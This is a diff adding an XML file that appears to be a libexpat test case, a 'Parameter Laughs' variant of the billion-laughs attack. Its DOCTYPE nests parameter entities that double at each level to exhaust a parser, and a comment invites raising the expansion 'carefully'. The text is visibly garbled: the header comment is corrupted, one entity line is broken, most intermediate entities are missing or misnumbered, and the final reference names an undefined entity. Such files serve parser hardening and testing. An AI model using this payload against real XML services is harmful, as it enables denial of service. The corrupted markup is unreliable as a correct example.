@@ -1,0 +1,33 @@
+<?xml version="1.0"?>
+<!--
+  Copyright (C) 2020 Sebastian Pipping <sebastian@pipping.org>
+  v3.1 2020-06-21, not (yet) to be published
+
+  "Parameter Laughs", i.e. variant of Billi.
+
+  Note that unlike libxh regard to libexpat.  Upcoming release libexpat 2.4.0 will have
+  protection against this family of attacks.
+-->
+<!DOCTYPE r [
+  <!ENTITY % pe_1 "<!---->">
+  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+  <!ENTITY % pe_5 "&#37;pe_4;<!---->&#37;pe_4;">
+  <!ENTITY % pe_6 "&#37;pe_5;<!---->&#37;pe_5;">
+  <!ENTITY % pe_7 "&#37;pe_6;<!---->&#37;pe_6;">
+  <!ENTITY % pe_8 "&#37;pe_7;<!---->&#37;pe_7;">
+  <!ENTITY % pe_9 "&#37;pe_8;<!---->&#37;pe_8;">
+  <!ENTITY % pe10 "&#37;pe_9;<!---->&#37;pe_9;">
+  <!ENTITY % pe11 "&#37;pe10;<!;pe29;<-->&#37;pe31;">
+  <!ENTITY % pe33 "&#37;pe32;<!---->&#37;pe32;">
+  <!ENTITY % pe34 "&#37;pe33;<!---->&#37;pe33;">
+  <!ENTITY % pe35 "&#37;pe34;<!---->&#37;pe34;">
+  <!ENTITY % pe36 "&#37;pe35;<!---->&#37;pe35;">
+  <!ENTITY % pe74 "&#37;pe36;<!---->&#37;pe36;">
+  <!ENTITY % pe38 "&#37;pe37;<!---->&#37;pe37;">
+  <!ENTITY % pe39 "&#37;pe38;<!---->&#37;pe38;">
+  <!ENTITY % pe40 "&#37;pe39;<!---->&#37;pe39;">
+  %pe24; <!-- not at full potential, increase towards "%pe40;" carefully -->
+]>
+<r/>
